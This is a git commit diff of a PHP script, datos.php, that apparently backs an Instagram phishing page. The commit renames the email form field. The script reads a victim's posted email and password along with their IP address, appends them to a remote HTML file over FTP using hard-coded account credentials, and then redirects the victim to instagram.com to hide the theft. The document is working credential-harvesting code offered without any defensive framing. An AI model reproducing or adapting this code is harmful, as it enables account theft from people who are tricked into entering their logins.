ab163d874f08b0662d92f84f4bd94e0eaba65626
codeteksistemas <58203899+codeteksistemas@users.noreply.github.com>
2020-08-03 21:19:28 -0500

    data4

--- datos.php
+++ datos.php
@@ -1,10 +1,10 @@
 <?php
 
-$email = $_POST['email']; 
+$correof = $_POST['correof'];
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a"); 
-fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
+fwrite ($f, 'Email: [<b><font color="#EE0707">'.$correof.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
 fclose($f);
 sleep(2);
 header("Location: https://www.instagram.com");
